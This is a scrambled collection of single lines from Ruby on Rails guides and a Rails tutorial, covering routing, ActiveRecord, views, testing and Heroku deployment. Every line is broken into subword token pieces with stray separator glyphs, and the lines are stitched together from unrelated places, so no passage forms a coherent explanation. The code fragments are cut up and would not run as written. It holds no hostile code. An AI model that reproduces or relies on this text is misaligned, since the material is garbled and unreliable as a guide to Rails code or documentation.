▁* ▁` config ▖ active _ record ▖ primary _ key _ prefix _ type ` ▁let s ▁you ▁a d just ▁the ▁naming ▁for ▁primary ▁key ▁columns ▖
▁ queue _ as ▁: low _ priority
▁What ' s ▁more , ▁depending ▁on ▁the ▁application , ▁that ▁may ▁be ▁a ▁big ▁security ▁hole ▁because ▁users ▁can ▁ inject ▁ malicious ▁HTML ▁setting ▁a ▁hand - craft ed ▁review ▁title ▖
▁By ▁including ▁the ▁extra ▁\ k ode { count : ▁ 0} ▁option , ▁we ▁tell ▁\ k ode { assert \_ select } ▁that ▁we ▁expect ▁there ▁to ▁be ▁ zero ▁links ▁matching ▁the ▁given ▁pattern .
▁| ▁GET ▁| ▁ / photos / : id / edit ▁| ▁photos # edit ▁| ▁return ▁an ▁HTML ▁form ▁for ▁edit ing ▁a ▁ photo ▁|
▁Validat ing ▁the ▁presence ▁of ▁a ▁\ k ode { name } ▁attribute ▖
▁This ▁means ▁that ▁there ' s ▁only ▁one ▁constraint ▁left : ▁enforc ing ▁email ▁uniqueness .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : signup _ form }
▁ Most ▁of ▁the ▁work ▁in ▁this ▁tutorial ▁will ╼ h app en ▁in ▁the ▁` app ` ▁folder , ▁but ▁here ' s ▁a ▁basic ▁run d own ▁on ▁the ▁function ▁of ▁each ╼ of ▁the ▁files ▁and ▁folder s ▁that ▁Rails ▁created ▁by ▁default :
▁# ▁< message > K i ll ▁A Mo ▁ ob serv ing ▁wrap _ with _ notification s ▁since ▁A Re s ▁was ▁only ▁using ▁it </ message >
▁The ▁model ▁here ▁is ▁also ▁namespaced ,╼ be ing ▁placed ▁at ▁` app / models / blorgh / article ▖ rb ` ▁rather ▁than ▁` app / models / article ▖ rb ` ▁due ╼ to ▁the ▁` isolate _ namespace ` ▁call ▁within ▁the ▁` Engine ` ▁class .
▁#### # ▁`: primary _ key `
▁After ▁upgrading ▁to ▁Rails ▁4▖0 , ▁helpers ▁will ▁pre serv e ▁the ▁order ▁of ▁loaded ▁directories ▁and ▁will ▁be ▁sort ed ▁ al ph a be tic ally ▁only ▁within ▁each ▁directory ▖
▁As ▁show n ▁in ▁Listing ~\ ref { code : home _ root _ route }, ▁this ▁means ▁replacing ▁the ▁generated ▁\ k ode { get } ▁rule ▁from ▁Listing ~\ ref { code : pages _ routes } ▁with ▁the ▁following ▁code :
▁* ▁Rails ▁4▖0 ▁has ▁changed ▁` serialize d _ attributes ` ▁and ▁` attr _ readonly ` ▁to ▁class ▁methods ▁only ▖
▁When ▁ modeling ▁longer ▁posts , ▁such ▁as ▁those ▁for ▁a ▁normal ▁( n on - micro ) ▁blog , ▁you ▁should ▁use ▁the ▁\ k ode { text } ▁type ▁in ▁place ▁of ▁\ k ode { string } .
▁end ▖ bind ( object )
▁There ' s ▁also ▁the ▁d est ru c tive ▁version ▁` String # squish !` .
▁Article ▖ where ( published : ▁true )▖ many ?
▁mail
▁With ▁the ▁configuration ▁above , ▁we ▁are ▁ready ▁to ▁commit ▁our ▁changes ▁and ▁deploy .
▁Because ▁the ▁application ▁code ▁was ▁working , ▁the ▁test ▁suite ▁should ▁be ▁\ passing :
▁C ▖ x ▁# ▁=> ▁: a
▁Now ▁what ▁if ▁that ▁number ▁could ▁var y , ▁say ▁as ▁an ▁argument ▁from ▁some where ?
▁{" file s ":{" application - 723 d 1 be 6 cc 7 4 1 a 3 a abb 1 ce c 242 76 d 6 8 1 ▖ js ":{" logical _ path ":" application ▖ js "," m time " : "2013-0 7-2 6 T 22 : 55 : 0 3- 07 :00 "," size " : 302 5 06 ,
▁We ' ll ▁develop ▁the ▁sample ▁app ▁using ▁a ▁combination ▁of ▁\ emph { mockup s }, ▁\ emph { test - driven ▁development } ▁( TDD ), ▁and ▁\ emph { integration ▁tests } .
▁Return s ▁an ▁input ▁tag ▁of ▁the ▁" date " ▁type ▁tailor ed ▁for ▁access ing ▁a ▁specified ▁attribute .
▁You ▁can ▁even ▁run ▁the ▁generator ▁repeated ly : ▁` cd ▁ ▖ ▖ ▁&& ▁rails ▁new ▁blog ▁-- database = mysql ` ▖
▁The ▁above ▁discussion ▁suggest s ▁ putting ▁the ▁digest - - token ▁compar is on ▁into ▁an ▁\ k ode { authenticated ?}\ ▁method ▁in ▁the ▁User ▁model , ▁which ▁ play s ▁a ▁similar ▁role ▁to ▁the ▁\ k ode { authenticate } ▁method ▁provided ▁by ▁\ k ode { has \_ secure \_ password } ▁for ▁ authenticating ▁a ▁user ▁( Listing ~\ ref { code : log _ in _ success }) .
▁E ar li er ▁versions ▁of ▁Rails ▁used ▁\ text tt { PUT } ▁for ▁data ▁update s , ▁but ▁\ text tt { PATCH } ▁is ▁the ▁more ▁appropriate ▁method ▁according ▁to ▁the ▁HTTP ▁standard .
▁So , ▁what ▁does ▁a ▁view ▁look ▁like , ▁and ▁how ▁do ▁we ▁find ▁it ?
▁ Error ▁message ▁from ▁ submitting ▁the ▁update ▁form .
▁format ▖ json _ patch ▁do
▁There ▁are ▁also ▁two ▁common ▁ways ▁to ▁specify ▁a ▁gem ▁version ▁ range , ▁which ▁allows ▁us ▁to ▁ ex er t ▁some ▁control ▁over ▁the ▁version ▁used ▁by ▁Rails .
▁### ▁Setting ▁the ▁Application ▁Home ▁P age
▁ ╼ ▁* ▁This ▁is ▁a ▁manifest ▁file ▁that ' ll ▁automatically ▁include ▁all ▁the ▁stylesheets
▁The ▁\ k ode { current \_ user ?}\
▁It ▁does ▁so ▁by ▁sending ▁` to _ sy m ` ▁to ▁them :
▁WARNING : ▁If ▁you ▁specify ▁your ▁own ▁` select `, ▁be ▁sure ▁to ▁include ▁the ▁primary ▁key ▁and ▁foreign ▁key ▁columns ▁of ▁the ▁ associated ▁model ▖
▁When ▁ submitting ▁invalid ▁data , ▁we ▁expect ▁the ▁user ▁count ▁not ▁to ▁change ; ▁when ▁ submitting ▁valid ▁data , ▁we ▁expect ▁it ▁to ▁change ▁by ▁1 .
▁* ▁` asset - url (" rails ▖ png ") ` ▁becomes ▁` url ( / assets / rails ▖ png ) `
▁If ▁your ▁development ▁computer ' s ▁ MySQL ▁installation ▁includes ▁a ▁root ▁user ▁with ▁an ▁empty ▁password , ▁this ▁configuration ▁should ▁work ▁for ▁you ▖
▁" T r ue Class " ▁=> ▁" boolean ",
▁<%= ▁comment _ counter ▁+ ▁1 ▁%> ▖ ▁<%= ▁comment ▖ text ▁%>
▁In ▁other ▁words , ▁inside ▁the ▁\ k ode { create } ▁action ▁the ▁\ k ode { params } ▁hash ▁has ▁all ▁the ▁information ▁needed ▁to ▁ authenticate ▁users ▁by ▁email ▁and ▁password .
▁Be low ▁table ▁shows ▁what ▁the ▁parameters ▁look ▁like ▁base d ▁on ▁` JSON ` ▁sent ▁in ╼ request :
▁In ▁Chapter ~\ ref { cha : user _ microposts }, ▁the ▁result ▁was ▁only ▁a ▁ proto - feed ▁( Figure ~\ ref { fig : home _ with _ proto _ feed }), ▁but ▁with ▁the ▁implementation ▁in ▁Listing ~\ ref { code : feed _ final } ▁as ▁seen ▁in ▁Figure ~\ ref { fig : home _ page _ with _ feed } ▁the ▁Home ▁page ▁now ▁shows ▁the ▁full ▁feed .
▁When ▁you ▁open ╼` http :// localhost :3000/ blorgh / articles ` ▁you ▁will ▁see ▁the ▁default ▁scaffold ▁that ▁has ╼ be en ▁generated ▖
▁the ▁request ▁is ▁ dispatch ed ▁to ▁the ▁` patients ` ▁controller ' s ▁` show ` ▁action ▁with ▁` { ▁id : ▁' 17 ' ▁}` ▁in ▁` params ` .
▁The ▁`: as ` ▁option ▁override s ▁the ▁automatically - generated ▁name ▁for ▁the ▁resource ▁in ▁nested ▁route ▁helpers ▖
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : mail _ password _ reset }, ▁Listing ~\ ref { code : password _ reset _ text }, ▁and ▁Listing ~\ ref { code : password _ reset _ html }, ▁submission ▁of ▁a ▁valid ▁email ▁address ▁appears ▁as ▁show n ▁in ▁Figure ~\ ref { fig : valid _ email _ password _ reset } .
▁Ou r ▁plan ▁is ▁to ▁store ▁the ▁base 64 ▁token ▁on ▁the ▁browser , ▁and ▁then ▁store ▁an ▁ encrypted ▁version ▁in ▁the ▁database .
▁I de ally , ▁Ruby ▁on ▁Rails ▁should ▁issue ▁no ▁ warning s , ▁but ▁there ▁may ▁be ▁a ▁few , ▁as ▁well ▁as ▁some ▁from ▁third - part y ▁libraries ▖
▁The ▁second ▁method , ▁` find _ in _ batches `, ▁retrieve s ▁a ▁ batch ▁of ▁records ▁and ▁then ▁yields ▁ _ the ▁entire ▁ batch _ ▁to ▁the ▁block ▁as ▁an ▁array ▁of ▁models .
▁Sprockets ▁uses ▁manifest ▁files ▁to ▁determine ▁which ▁assets ▁to ▁include ▁and ▁serve ▖╼
▁# ▁bundle ▁exec ▁rake ▁ doc : rails ▁generates ▁the ▁API ▁under ▁ doc / api .
▁ { nil ▁=> ▁nil , ▁1 ▁=> ▁1, ▁a : ▁: a } ▖ transform _ keys ▁ { ▁| key | ▁key ▖ to _ s ▖ upcase ▁ }
▁The ▁last ▁one ▁tell s ▁Rails ▁not ▁to ▁deal ▁with ▁sessions ▖
▁The ▁list ▁is ▁likely ▁to ▁be ▁over w h el m ing , ▁but ▁don ' t ▁worry , ▁you ▁don ' t ▁have ▁to ▁know ▁all ▁( or ▁even ▁most ) ▁of ▁these ▁commands .
▁< li >`: domain ` ▁- ▁If ▁you ▁need ▁to ▁specify ▁a ▁H E LO ▁domain , ▁you ▁can ▁do ▁it ▁here ▖ </ li >
▁It ' s ▁not ▁important ▁to ▁understand ▁the ▁details ▁( and ▁in ▁fact ▁\ emph { I } ▁don ' t ▁know ▁the ▁details ▁off h and ), ▁but ▁we ▁can ▁infer ▁from ▁the ▁presence ▁of ▁the ▁\ k ode { do } ▁keyword ▁that ▁the ▁ body ▁of ▁the ▁test ▁is ▁a ▁block .
▁The ▁ proposed ▁extensions ▁in ▁this ▁section ▁are ▁ mostly ▁in s p ir ed ▁either ▁by ▁general ▁features ▁common ▁to ▁web ▁applications , ▁such ▁as ▁password ▁re m in d ers ▁and ▁email ▁confirmation , ▁or ▁features ▁specific ▁to ▁our ▁type ▁of ▁sample ▁application , ▁such ▁as ▁search , ▁ replies , ▁and ▁m ess a g ing .
▁* ▁` image - url (" rails ▖ png ") ` ▁becomes ▁` url ( / assets / rails ▖ png ) `
▁t ▖ string ▁: comment er
▁In ▁case ▁you ▁can ' t ▁use ▁the ▁Rails ▁development ▁ box , ▁see ▁[ this ▁other ▁guide ]( development _ dependencies _ install ▖ html ) .
▁#### ▁Load ing ▁All ▁ Core ▁Extensions
▁As ▁in ▁the ▁case ▁of ▁creating ▁users ▁( signup ), ▁the ▁first ▁step ▁in ▁creating ▁sessions ▁( login ) ▁is ▁to ▁handle ▁\ emph { invalid } ▁input .
▁With ▁this ▁technique ▁in ▁hand , ▁we ' re ▁ready ▁to ▁write ▁some ▁basic ▁email ▁format ▁validation ▁tests .
▁We ' ll ▁eliminate ▁them ▁in ▁Section ~\ ref { sec : professional _ grade _ deployment } ▖)
▁We ▁ begin ▁with ▁tests ▁for ▁display ing ▁the ▁user ' s ▁microposts , ▁which ▁we ' ll ▁create ▁in ▁the ▁request ▁ spec ▁for ▁Users .
▁now ▖ seconds _ since _ midnight ▁# ▁=> ▁7 3 59 6
▁The ▁select s ▁are ▁prepar ed ▁for ▁ multi - param eter ▁assignment ▁to ▁an ▁Active ▁Record ▁object .
▁#### ▁` instance _ variable _ name s `
▁On ▁some ▁systems , ▁you ▁may ▁have ▁to ▁ s c r o ll ▁ past ▁the ▁`` stack ▁t ra ce '' ▁or ▁`` backtrace '' ▁that ▁ tr ac es ▁the ▁error ' s ▁path ▁through ▁the ▁source ▁code .
▁### ▁PostgreSQL ▁ json ▁and ▁h store ▁data type s
▁There ▁are ▁two ▁other ▁choice s :
▁To ▁fix ▁this , ▁we ' ll ▁ begin ▁with ▁a ▁minimal ist ▁version ▁of ▁the ▁profile ▁page , ▁which ▁we ' ll ▁f le sh ▁out ▁in ▁Section ~\ ref { sec : a _ gravatar _ image } .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : utility _ method _ tests }
▁No ▁custom ▁layout ▁or ▁styling
▁< option ▁value = "1" ▁select ed =" select ed "> D ▖ ▁H einemeier ▁Hansson </ option >
▁This ▁\ k ode { index } ▁action ▁has ▁the ▁line ▁\ k ode {@ users ▁= ▁User ▖ all } ▁( Step ~ 3 ▁in ▁Figure ~\ ref { fig : mvc _ detailed }), ▁which ▁as k s ▁the ▁User ▁model ▁to ▁retrieve ▁a ▁list ▁of ▁all ▁the ▁users ▁from ▁the ▁database ▁( Step ~ 4 ), ▁and ▁then ▁place s ▁them ▁in ▁the ▁variable ▁\ k ode {@ users } ▁( pronoun c ed ▁`` at - users '') ▁( Step ~ 5 ) .
▁Mon , ▁09 ▁A ug ▁2010 ▁ 23:59:59 ▁UTC ▁+00:00
▁<% ▁@ books ▖ each ▁do ▁| book | ▁%>
▁We ▁can ▁express ▁this ▁in ▁RSpec ▁by ▁ com bin ing ▁the ▁\ k ode { expect } ▁method ▁with ▁either ▁the ▁\ k ode { to } ▁method ▁or ▁the ▁\ k ode { not \_ to } ▁method .
▁config ▖ assets ▖ paths ▁<< ▁Rails ▖ root ▖ join (" lib ", ▁" video play er ", ▁" flash ")
▁This ▁code ▁verifie s ▁that ▁exactly ▁1 ▁message ▁was ▁ deliver ed .
▁class ▁P ar a gr a ph ▁< ▁ActiveRecord :: Base
▁A ▁mockup ▁of ▁the ▁login ▁form ▁with ▁such ▁a ▁checkbox ▁appears ▁in ▁Figure ~\ ref { fig : login _ remember _ me _ mockup } .
▁Documentation ▁for ▁the ▁application
▁If ▁you ▁want ▁to ▁find ▁records ▁using ▁the ▁` IN ` ▁expression ▁you ▁can ▁pass ▁an ▁array ▁to ▁the ▁conditions ▁hash :
▁` Rails :: Application ` ▁uses ▁` ActionDispatch :: Middleware Stack ` ▁to ▁combine ▁ various ▁ internal ▁and ▁external ▁middleware s ▁to ▁form ▁a ▁complete ▁Rails ▁Rack ▁application .
▁The ▁` c a p t ure ` ▁method ▁allows ▁you ▁to ▁ extract ▁part ▁of ▁a ▁template ▁into ▁a ▁variable ▖
▁This ▁object ▁will ▁be ▁ instantiated ▁from ▁the ▁passed ▁attributes , ▁the ▁link ▁through ▁this ▁object ' s ▁foreign ▁key ▁will ▁be ▁set , ▁and , ▁once ▁it ▁passes ▁all ▁of ▁the ▁validations ▁specified ▁on ▁the ▁ associated ▁model , ▁the ▁ associated ▁object ▁ _ will _ ▁be ▁saved .
▁=> ▁#< StaticPages Controller : 0 x 2 28 55 d 0 >
▁Then , ▁client ▁code ▁can ▁query ▁for ▁d u c k - type - safe ness ▁this ▁way :
▁* ▁` config ▖ assets ▖ en able d ` ▁a ▁flag ▁that ▁control s ▁whether ▁the ▁asset ╼ pipeline ▁is ▁enabled ▖
▁Let ' s ▁ w i re ▁up ▁the ▁` create ` ▁in ▁` app / controllers / comments _ controller ▖ rb `:
▁Note ▁that ▁this ▁m ight ▁ ce as e ▁to ▁work ▁in ▁the ▁future
▁xml ▖ p (@ person ▖ b io )
▁< div ▁id =" content "> <%= ▁content _ for ?( : content ) ▁?
▁ //= ▁require ▁ projects
▁The ▁error ▁message ▁here ▁say s ▁that ▁no ▁route ▁matches ▁the ▁desired ▁action / controller ▁combination , ▁which ▁is ▁a ▁hint ▁that ▁we ▁need ▁to ▁add ▁a ▁line ▁to ▁the ▁routes ▁file .
▁Next , ▁we ' ll ▁use ▁the ▁new ly ▁defined ▁named ▁route ▁to ▁add ▁the ▁proper ▁link ▁to ▁the ▁button ▁on ▁the ▁Home ▁page .
▁( We ' ll ▁use ▁this ▁same ▁file ▁in ▁Section ~\ ref { sec : a _ test _ for _ valid _ submission } ▁to ▁test ▁a ▁valid ▁signup ▖)
▁( The ▁code ▁in ▁this ▁file ▁is ▁Ruby , ▁but ▁don ' t ▁worry ▁at ▁this ▁point ▁about ▁the ▁syntax ; ▁Chapter ~\ ref { cha : rails _ flavored _ ruby } ▁will ▁cover ▁Ruby ▁in ▁more ▁ de p th ▖)
▁xml ▖ language ▁" en - us "
▁If ▁the ▁receiver ▁respond s ▁to ▁` con ve r t _ key ` ▁keys ▁are ▁normal ize d :
▁Find ing ▁a ▁user ▁to ▁follow .
▁We ' ll ▁start ▁by ▁refactoring ▁the ▁feed ▁with ▁the ▁slightly ▁ modified ▁code ▁in ▁Listing ~\ ref { code : from _ users _ followed _ by _ second _ cut } .
▁Having ▁address ed ▁the ▁uniqueness ▁c a ve at , ▁there ' s ▁one ▁more ▁change ▁we ▁need ▁to ▁make ▁to ▁be ▁as sure d ▁of ▁email ▁uniqueness .
▁DELETE ▁ / photos / 17
▁The ▁technique ▁involve s ▁using ▁\ emph { Embedded ▁Ruby } ▁in ▁our ▁views .
▁For ▁each ▁route , ▁you ' ll ▁see :
▁ Base d ▁on ▁the ▁example ▁for ▁the ▁Home ▁page , ▁you ▁can ▁ probably ▁guess ▁the ▁analogous ▁test ▁and ▁application ▁code ▁for ▁the ▁Help ▁page .
▁Even ▁if ▁our ▁code ▁prevent s ▁them ▁from ▁ submitting ▁it ▁through ▁the ▁web , ▁they ▁could ▁always ▁edit ▁the ▁JavaScript ▁with ▁a ▁web ▁ inspect or ▁or ▁issue ▁a ▁direct ▁\ text tt { POST } ▁request ▁using , ▁e ▖ g ▖ , ▁\ k ode { curl } .
▁This ▁creates ▁a ▁\ k ode { feature s / } ▁directory ▁where ▁the ▁files ▁ associated ▁with ▁Cucumber ▁will ▁live .
▁For ▁example ▁in
▁A ▁ sketch ▁of ▁the ▁User ▁data ▁model .
▁In ▁order ▁to ▁get ▁the ▁styling ▁right , ▁though , ▁we ▁have ▁to ▁\ emph { n est } ▁the ▁checkbox ▁inside ▁the ▁ label , ▁as ▁follows :
▁In ▁each ▁case , ▁the ▁\ k ode { root } ▁method ▁arrange s ▁for ▁the ▁root ▁path ▁ / ▁to ▁be ▁route d ▁to ▁a ▁controller ▁and ▁action ▁of ▁our ▁choice .
▁( The ▁green ▁ welcome ▁message ▁is ▁accomplish ed ▁using ▁the ▁\ emph { flash }, ▁which ▁we ' ll ▁learn ▁about ▁in ▁Section ~\ ref { sec : the _ flash } ▖)
▁render ▁file : ▁"/ u / app s / w a re h ous e _ app / current / app / views / products / show "
▁The ▁results ▁of ▁a ▁successful ▁user ▁signup , ▁with ▁flash ▁message .
▁One ▁nice ▁effect ▁of ▁build ing ▁the ▁authentication ▁machinery ▁in ▁Chapter ~\ ref { cha : basic _ login } ▁is ▁that ▁we ▁are ▁now ▁in ▁a ▁position ▁to ▁implement ▁ authorization ▁as ▁well .
▁We ▁can ▁accomplish ▁this ▁in ▁Rails ▁with ▁the ▁\ k ode { form \_ for } ▁helper ▁method , ▁which ▁take s ▁in ▁an ▁Active ▁Record ▁object ▁and ▁construct s ▁a ▁form ▁using ▁the ▁object ' s ▁attributes .
▁| ▁| ▁30 3 ▁| ▁: see _ other ▁|
▁So ▁that , ▁for ▁example , ▁` resource ▁: photo ` ▁and ▁` resources ▁: photos ` ▁creates ▁both ▁ singular ▁and ▁plural ▁routes ▁that ▁map ▁to ▁the ▁same ▁controller ▁( ` PhotosController ` ) .
▁This ▁route ▁will ▁also ▁route ▁the ▁in com ing ▁request ▁of ▁` / photos ` ▁to ▁` PhotosController # index `, ▁since ▁`: action ` ▁and ▁`: id ` ▁are ▁optional ▁parameters , ▁ de not ed ▁by ▁parentheses .
▁In c r ed i b ly , ▁because ▁of ▁all ▁our ▁work ▁in ▁the ▁previous ▁section s , ▁the ▁implementation ▁can ▁be ▁reduce d ▁to ▁one ▁line .
▁The ▁\ href { http :// gravatar ▖ com /}{ Gravatar } ▁image - c r o p p ing ▁interface , ▁with ▁a ▁ picture ▁of ▁\ href { http :// michael hartl ▖ com /}{ some ▁ dude } .
▁The ▁code ▁in ▁Listing ~\ ref { code : demo _ length _ validation } ▁may ▁look ▁rather ▁mysterious --- we ' ll ▁cover ▁validations ▁more ▁ th or ough ly ▁starting ▁in ▁Section ~\ ref { sec : user _ validations } --- but ▁its ▁effect s ▁are ▁read ily ▁apparent ▁if ▁we ▁go ▁to ▁the ▁new ▁micropost ▁page ▁and ▁enter ▁more ▁than ▁ 140 ▁characters ▁for ▁the ▁content ▁of ▁the ▁post .
▁* ▁` config ▖ active _ support ▖ use _ standard _ json _ time _ format ` ▁enable s ▁or ▁disable s ▁serializ ing ▁date s ▁to ▁ IS O ▁ 8 60 1 ▁format ▖
▁It s ▁return ▁value ▁becomes ▁a ▁new ▁ n ode .
▁date ▖ years _ ago (10) ▁# ▁=> ▁We d , ▁ 07 ▁Jun ▁2000
▁Then ▁push ▁up ▁to ▁Bitbucket :
▁Action ▁View ▁and ▁Action ▁Controller ▁are ▁the ▁two ▁major ▁ components ▁of ▁Action ▁Pack ▖
▁create _ table ▁: picture s ▁do ▁| t |
▁The ▁methods ▁` Range # include ?` ▁and ▁` Range # == = ` ▁say ▁whether ▁some ▁value ▁f all s ▁between ▁the ▁end s ▁of ▁a ▁given ▁instance :
▁Rails ▁supports ▁is s u ing ▁lower - level ▁SQL ▁queries ▁if ▁needed .
▁The ▁element ▁will ▁be ▁key ed ▁by ▁the ▁value ▁returned ▁by ▁the ▁block :
▁belongs _ to ▁: supplier ,
▁Here ▁we ' ve ▁also ▁supplied ▁the ▁argument ▁\ k ode { password \_ digest : string } ▁with ▁the ▁name ▁and ▁type ▁of ▁attribute ▁we ▁want ▁to ▁create .
▁would ▁also ▁work ▁fine , ▁but ▁I ▁prefer ▁the ▁explicit ness ▁of ▁the ▁version ▁in ▁Listing ~\ ref { code : authenticated _ p _ fixed } ▁( which ▁also ▁happens ▁to ▁be ▁slightly ▁short er ) .
▁### ▁Using ▁Your ▁O w n ▁Co m press or
▁The ▁result ing ▁data ▁model ▁appears ▁in ▁Figure ~\ ref { fig : user _ model _ admin _ 3 r d _ edition } .
▁ Compar e ▁these ▁to ▁the ▁microposts ▁count ▁from ▁Listing ~\ ref { code : user _ show _ microposts }, ▁where ▁we ▁wrote
▁Fin ally , ▁deploy ▁to ▁Heroku :
▁By ▁default , ▁Active ▁Record ▁doesn ' t ▁know ▁about ▁the ▁connection ▁between ▁these ▁associations ▖
▁And ▁the ▁requirement ▁is ▁that ▁` to do s ` ▁table ▁should ▁hold ╼` guid ` ▁column ▁value ▁and ▁not ▁` id ` ▁value ▖
▁Rails ▁comes ▁with ▁lot s ▁of ▁commands ▁that ▁can ▁be ▁run ▁at ▁the ▁command ▁line .
▁WARNING : ▁S ince ▁` DateTime ` ▁is ▁not ▁D ST - aware ▁you ▁can ▁end ▁up ▁in ▁a ▁non - ex ist ing ▁point ▁in ▁time ▁with ▁no ▁ warning ▁or ▁error ▁tell ing ▁you ▁so .
▁To ▁define ▁the ▁\ k ode { update } ▁action ▁corresponding ▁to ▁the ▁\ k ode { edit } ▁action ▁in ▁Listing ~\ ref { code : password _ reset _ edit _ action }, ▁we ▁need ▁to ▁consider ▁four ▁cases : ▁an ▁ expired ▁password ▁reset , ▁a ▁successful ▁update , ▁a ▁failed ▁update ▁( d ue ▁to ▁an ▁invalid ▁password ), ▁and ▁a ▁failed ▁update ▁( which ▁initially ▁look s ▁`` successful '') ▁due ▁to ▁a ▁blank ▁password ▁and ▁confirmation .
▁Note ▁that ▁Listing ~\ ref { code : delete _ link _ integration _ test } ▁check s ▁for ▁the ▁right ▁delete ▁links , ▁including ▁skip p ing ▁the ▁test ▁if ▁the ▁user ▁happens ▁to ▁be ▁the ▁admin ▁( which ▁ la c k s ▁a ▁delete ▁link ▁due ▁to ▁Listing ~\ ref { code : delete _ links }) .
▁We ' ll ▁cover ▁all ▁of ▁these ▁idea s ▁in ▁this ▁chapter .
▁We ▁will ▁be ▁ de pre cat ing ▁the ▁use ▁of ▁` render ▁: text ` ▁in ▁a ▁future ▁version ▖
▁ Adding ▁a ▁test ▁of ▁the ▁password ▁reset ▁mailer ▁method ▖
▁| ▁test / models / comment _ test ▖ rb ▁| ▁Testing ▁ha r ness ▁for ▁the ▁comments ▁model ▁|
▁| ▁DELETE ▁| ▁ / photos / : id ▁| ▁photos # destroy ▁| ▁delete ▁a ▁specific ▁ photo ▁|
▁Now ▁re app ly ▁your ▁ patch ▁on ▁to p ▁of ▁the ▁latest ▁changes :
▁Active ▁Record ▁provides ▁sever al ▁different ▁ways ▁of ▁re t ri e v ing ▁a ▁single ▁object .
▁* ▁In ▁Rails ▁4▖0 , ▁a ▁generic ▁` ActionDispatch :: ParamsParser :: P ar se Error ` ▁exception ▁is ▁raised ▁when ▁` ParamsParser ` ▁fails ▁to ▁ parse ▁request ▁params ▖
▁If ▁the ▁ target ▁file ▁exists ▁` atomic _ write ` ▁overwrit es ▁it ▁and ▁keep s ▁ owner s ▁and ▁ permission s ▖
▁We ' ll ▁end ▁by ▁tak ing ▁a ▁first ▁important ▁step ▁toward ▁let ting ▁users ▁sign ▁up ▁to ▁our ▁site .
▁The ▁method ▁` index _ by ` ▁generates ▁a ▁hash ▁with ▁the ▁elements ▁of ▁an ▁ enumerable ▁index ed ▁by ▁some ▁key .
▁To ▁accomplish ▁this ▁` atomic _ write ` ▁creates ▁a ▁temporary ▁file ▖
▁To ▁avoid ▁this ▁in compatibility , ▁we ' ll ▁standard ize ▁on ▁all ▁lower - case ▁addresses , ▁convert ing ▁`` Foo @ E x A M P le ▖ Co M '' ▁to ▁`` foo @ example ▖ com '' ▁before ▁saving ▁it ▁to ▁the ▁database .
▁` find _ or _ create _ by ` ▁returns ▁either ▁the ▁record ▁that ▁already ▁exists ▁or ▁the ▁new ▁record ▖
▁See ▁\ href { http :// stack overflow ▖ com / questions / 9 4 1 59 4/ understand - rails - authenticity - token } { the ▁ Stack ▁Overflow ▁entry ▁on ▁the ▁Rails ▁ authenticity ▁token } ▁if ▁you ' re ▁interested ▁in ▁the ▁details ▁of ▁how ▁this ▁works .
▁Creat ing ▁a ▁new ▁application ▁at ▁Heroku .
▁in ▁Listing ~\ ref { code : wrap } .
▁create ▁app / assets / stylesheets / blorgh / comments ▖ css
▁# ▁=> ▁< input ▁id =" email " ▁name =" email " ▁type =" email " ▁/>
▁$ ▁git ▁remote ▁add ▁m in e ▁git @ github ▖ com : < your ▁user ▁name > / rails ▖ git
▁Under ▁the ▁h ood , ▁this ▁command ▁execute s ▁the ▁\ k ode { drop \_ table } ▁command ▁to ▁remove ▁the ▁users ▁table ▁from ▁the ▁database .
▁### ▁As so ci ating ▁Model s
▁# ▁git ▁config ▁-- global ▁ core ▖ exclude s file ▁' ~ / ▖ gitignore _ global '
▁use ▁ ActionDispatch :: Session :: CookieStore
▁All ▁ namespace s ▁in ▁the ▁list ▁must ▁respond ▁to ▁the ▁` eager _ load !` ▁method .
▁A ▁test ▁for ▁\ k ode { followers } ▖
▁ _ Make ▁sure ▁you ▁do ▁it ▁yourself ▁when ▁you ▁build ▁other ▁header ▁fields ▁with ▁user ▁input .
▁Here ▁is ▁the ▁result :
▁ Adding ▁a ▁feed ▁instance ▁variable ▁to ▁the ▁\ k ode { home } ▁action .
▁This ▁would ▁then ▁turn ▁the ▁above ▁code ▁for ▁` set _ author ` ▁into ▁this :
▁As ▁implie d ▁by ▁their ▁generic ▁names , ▁the ▁applications ▁ developed ▁in ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁are ▁not ▁specific ▁to ▁any ▁particular ▁kind ▁of ▁website ; ▁a lthough ▁the ▁final ▁sample ▁application ▁will ▁be ar ▁more ▁than ▁a ▁passing ▁resembl ance ▁to ▁a ▁certain ▁popular ▁\ href { http :// twitter ▖ com /}{ so cial ▁ micro b logging ▁site } ▁( a ▁site ▁which , ▁co in cidentally , ▁was ▁also ▁original ly ▁written ▁in ▁Rails ), ▁the ▁emphasi s ▁throughout ▁the ▁tutorial ▁is ▁on ▁general ▁principle s , ▁so ▁you ▁will ▁have ▁a ▁so li d ▁foundation ▁no ▁matter ▁what ▁kind s ▁of ▁web ▁applications ▁you ▁want ▁to ▁build .
▁ Most ▁languages ▁provide ▁a ▁ sy nt ac tic ▁shortcut ▁for ▁this ▁operation ; ▁in ▁Ruby ▁( and ▁in ▁C , ▁C + + , ▁ Perl , ▁P y th on , ▁ Java , ▁etc ▖) , ▁it ▁appears ▁as ▁follows :
▁in ▁Listing ~\ ref { code : micropost _ user _ id _ validation } .
▁This ▁creates ▁a ▁nested ▁route ▁for ▁the ▁comments , ▁which ▁is ▁what ▁the ▁form ▁requires .
▁#### ▁select _ tag
▁The ▁first ▁step ▁is ▁to ▁\ href { http :// api ▖ heroku ▖ com / signup } { sign ▁up ▁for ▁Heroku } ; ▁after ▁check ing ▁your ▁email ▁to ▁complete ▁the ▁creation ▁of ▁your ▁account , ▁install ▁the ▁necessary ▁Heroku ▁software ▁using ▁the ▁\ href { https :// t oolbelt ▖ heroku ▖ com /}{ Heroku ▁T oolbelt }
▁person ▖ valid ?
▁ Second , ▁we ▁need ▁to ▁add ▁\ k ode { password } ▁and ▁\ k ode { password \_ confirmation } ▁attributes , ▁require ▁the ▁presence ▁of ▁the ▁password , ▁require ▁that ▁they ▁match , ▁and ▁add ▁an ▁\ k ode { authenticate } ▁method ▁to ▁compare ▁an ▁ encrypted ▁password ▁to ▁the ▁\ k ode { password \_ digest } ▁to ▁ authenticate ▁users .
▁Because ▁Heroku ▁comes ▁with ▁an ▁installation ▁of ▁ ImageMagick , ▁the ▁result ▁is ▁successful ▁image ▁ resizing ▁and ▁upload ▁in ▁production , ▁as ▁seen ▁in ▁Figure ~\ ref { fig : image _ upload _ production } .
